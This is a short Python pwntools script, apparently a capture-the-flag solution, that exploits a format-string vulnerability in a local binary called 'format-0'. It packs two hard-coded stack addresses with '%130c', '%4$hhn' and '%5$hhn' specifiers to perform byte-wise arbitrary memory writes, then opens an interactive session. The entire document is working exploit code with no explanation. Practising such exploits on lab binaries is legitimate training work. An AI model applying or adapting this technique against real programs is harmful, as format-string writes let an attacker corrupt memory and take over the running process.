#!/usr/bin/env python

from pwn import *

# prev       = 0x804928a
# write_addr = 0x80491f6

addr1 = 0xff8b0d3c
addr2 = 0xff8b0d3d

p = process('./format-0')

raw_input('#')

payload = p32(addr1)
payload += p32(addr2)
payload += "%130c"
payload += "%4$hhn"
payload += "AAAA"
payload += "%5$hhn"

# payload = "A" * 4
p.sendline(payload)


p.interactive()